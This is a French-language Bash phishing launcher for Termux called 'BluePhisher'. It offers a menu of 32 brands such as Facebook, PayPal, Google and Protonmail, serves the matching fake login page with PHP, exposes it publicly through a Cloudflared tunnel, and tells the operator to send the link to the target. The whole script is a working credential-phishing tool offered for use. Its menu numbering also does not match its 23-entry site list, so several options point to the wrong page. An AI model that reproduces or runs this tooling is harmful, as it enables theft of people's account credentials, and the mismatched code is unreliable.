#!/data/data/com.termux/files/usr/bin/bash
# language: Bash, file: bluephisher.sh
# BluePhisher — menu de redirection pour pages de capture
# par ValkrisDrayco

R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
C='\033[1;36m'
M='\033[1;35m'
W='\033[0m'

banner() {
    clear
    echo -e "${R}"
    cat << 'EOF'
  ██████╗ ██╗     ██╗   ██╗███████╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗
  ██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
  ██████╔╝██║     ██║   ██║█████╗  ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
  ██╔══██╗██║     ██║   ██║██╔══╝  ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
  ██████╔╝███████╗╚██████╔╝███████╗██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
EOF
    echo -e "${W}"
    echo -e "${Y}              Version 1.0${W}"
    echo -e "${G}        [+] Créé par ValkrisDrayco${W}"
    echo -e "${M}     ..: Sélectionne une cible :..${W}"
    echo ""
}

menu() {
    echo -e "${R}  ┌───────────────────────┬───────────────────────┬───────────────────────┐${W}"
    echo -e "${R}  │${W} ${C}01${W} Facebook        ${R}│${W} ${C}11${W} TikTok          ${R}│${W} ${C}21${W} DeviantArt      ${R}│${W}"
    echo -e "${R}  │${W} ${C}02${W} Instagram       ${R}│${W} ${C}12${W} Roblox          ${R}│${W} ${C}22${W} Badoo           ${R}│${W}"
    echo -e "${R}  │${W} ${C}03${W} Google          ${R}│${W} ${C}13${W} Twitch          ${R}│${W} ${C}23${W} Origin          ${R}│${W}"
    echo -e "${R}  │${W} ${C}04${W} Microsoft       ${R}│${W} ${C}14${W} Pinterest       ${R}│${W} ${C}24${W} CryptoCoin      ${R}│${W}"
    echo -e "${R}  │${W} ${C}05${W} Netflix         ${R}│${W} ${C}15${W} Snapchat        ${R}│${W} ${C}25${W} Yahoo           ${R}│${W}"
    echo -e "${R}  │${W} ${C}06${W} PayPal          ${R}│${W} ${C}16${W} LinkedIn        ${R}│${W} ${C}26${W} Wordpress       ${R}│${W}"
    echo -e "${R}  │${W} ${C}07${W} Steam           ${R}│${W} ${C}17${W} Ebay            ${R}│${W} ${C}27${W} Yandex          ${R}│${W}"
    echo -e "${R}  │${W} ${C}08${W} Twitter         ${R}│${W} ${C}18${W} Dropbox         ${R}│${W} ${C}28${W} StackOverflow   ${R}│${W}"
    echo -e "${R}  │${W} ${C}09${W} PlayStation     ${R}│${W} ${C}19${W} Protonmail      ${R}│${W} ${C}29${W} VK              ${R}│${W}"
    echo -e "${R}  │${W} ${C}10${W} GitHub          ${R}│${W} ${C}20${W} Spotify         ${R}│${W} ${C}30${W} Reddit          ${R}│${W}"
    echo -e "${R}  ├───────────────────────┼───────────────────────┼───────────────────────┤${W}"
    echo -e "${R}  │${W} ${M}31${W} Adobe           ${R}│${W} ${M}32${W} Discord         ${R}│${W} ${R}X${W}  Quitter        ${R}│${W}"
    echo -e "${R}  └───────────────────────┴───────────────────────┴───────────────────────┘${W}"
    echo ""
}

sites=(facebook instagram google microsoft netflix paypal steam twitter playstation github tiktok roblox twitch pinterest snapchat linkedin ebay dropbox protonmail spotify reddit adobe discord)

start_serveur() {
    local site="$1"
    local dir="$HOME/BlueFoxTool/modules/bluephisher/sites/$site"

    if [ ! -d "$dir" ]; then
        echo -e "${R}[!] Dossier '$site' introuvable${W}"
        echo -e "${Y}[*] Crée-le : mkdir -p $dir${W}"
        read -p "Entrée..."
        return
    fi

    if ! command -v php >/dev/null 2>&1; then
        pkg install php -y
    fi

    cd "$dir" || return
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 1

    clear
    banner
    echo -e "${G}  [+] Page '$site' servie en local${W}"
    echo -e "${C}  [*] Local  : http://localhost:3333${W}"
    echo ""
    echo -e "${Y}   1) Rester en local (test)${W}"
    echo -e "${Y}   2) Exposer via Cloudflared (public)${W}"
    echo ""
    read -p "  Choix > " mode

    if [ "$mode" = "2" ]; then
        if ! command -v cloudflared >/dev/null 2>&1; then
            pkg install cloudflared -y
        fi
        cloudflared tunnel --url http://localhost:3333 > /tmp/bp_tunnel.log 2>&1 &
        sleep 6
        URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/bp_tunnel.log | head -1)
        echo ""
        echo -e "${G}  [+] URL publique : $URL${W}"
        echo -e "${Y}  [*] Envoie ce lien à la cible.${W}"
    fi

    echo ""
    echo -e "${M}  [*] Entrée pour tout arrêter...${W}"
    read -p ""

    kill $PHP_PID 2>/dev/null
    pkill -f cloudflared 2>/dev/null
}

while true; do
    banner
    menu
    echo -ne "${G}  [~] Option > ${W}"
    read choice

    if [ "$choice" = "x" ] || [ "$choice" = "X" ]; then
        echo -e "${R}  bye.${W}"
        exit 0
    fi

    idx=$((10#$choice - 1))
    if [ "$idx" -ge 0 ] && [ "$idx" -lt "${#sites[@]}" ]; then
        start_serveur "${sites[$idx]}"
    else
        echo -e "${R}  [!] Option invalide${W}"
        sleep 1
    fi
done
